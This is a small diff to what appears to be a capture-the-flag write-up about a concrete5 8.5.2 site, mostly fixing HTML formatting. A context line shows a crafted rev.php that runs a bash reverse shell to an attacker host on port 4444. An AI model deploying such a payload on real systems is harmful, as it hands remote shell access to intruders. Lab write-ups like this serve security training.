@@ -290,6 +290,7 @@ It worked... My evil plan is going smoothly.
 
 
 <br>
+<br>
 
 > 1.1. <em>What CMS and version is being used? (format: wordpress x.x.x)</em><br><a id='1.1'></a>
 >> <strong><code>concrete5 - 8.5.2</code></strong><br>
@@ -356,7 +357,7 @@ It worked... My evil plan is going smoothly.
 
 <p>
 
-- crafted a <code>rev.php</code.</p>
+- crafted a <code>rev.php</code></p>
 
 ```bash
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/AttackIP/4444 0>&1'");?>
